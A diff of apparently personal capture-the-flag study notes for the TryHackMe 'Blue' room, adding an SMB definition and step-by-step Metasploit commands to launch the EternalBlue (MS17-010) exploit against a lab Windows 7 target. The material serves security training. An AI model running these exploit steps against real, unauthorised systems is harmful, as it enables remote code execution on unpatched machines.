@@ -10,8 +10,10 @@ room
 ============= 
 https://tryhackme.com/room/blue
 
-https://github.com/DarkStar7471/CTF-Write-Ups-And-Items/tree/master/TryHackMe
-              walkthrough video (John Hammond)
+ 
+https://github.com/DarkStar7471/CTF-Write-Ups-And-Items/tree/master/TryHackMe/Blue-Win7
+    
+	walkthrough video (John Hammond)
                        ==============
 https://www.youtube.com/watch?v=s6rwS7UuMt8&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=2
 
@@ -46,11 +48,41 @@ https://www.youtube.com/watch?v=s6rwS7UuMt8&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp
 | The target system is vulnerable to   ms17-010.  
  known as Eternal Blue! We can exploit this to run arbitrary code on the target system
 
+Server Message Block (SMB): a communication protocol[1] used to share files, printers, serial ports, and miscellaneous communications between nodes on a network. 
 
+4.1	msfconsole: start Metasploit
+   [msf](Jobs:0 Agents:0) >> search ms17-010 :   find ms17-010 related exploits
 
+    output:
+	 #  Name                                      Disclosure Date  Rank   Check Description
 
-	   https://youtu.be/s6rwS7UuMt8?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=399
-	  https://github.com/DarkStar7471/CTF-Write-Ups-And-Items/tree/master/TryHackMe/Blue-Win7
-4.		
-		
+	 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14      average  Yes  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+     1......
+	 
+	 
+	 
+3.2 use the exploit 
+    [msf](Jobs:0 Agents:0) >>    use exploit/windows/smb/ms17_010_eternalblue 
+	
+4.3 check what options we must set before running this exploit 
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>   show options
+
+ result:  
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s) 
+   .......
+        
+Looks like we'll have to set the RHOST, remote host 	
+ 
+4.4	[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> 	set RHOSTS <HOST IP>
+
+4.5 run it! 
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit
+ 
+ This can occasionally fail, try running it a couple times after 
+ rebooting this vulnerable machine if necessary.
+ 
+ 
+ 
 10.10.31.153 
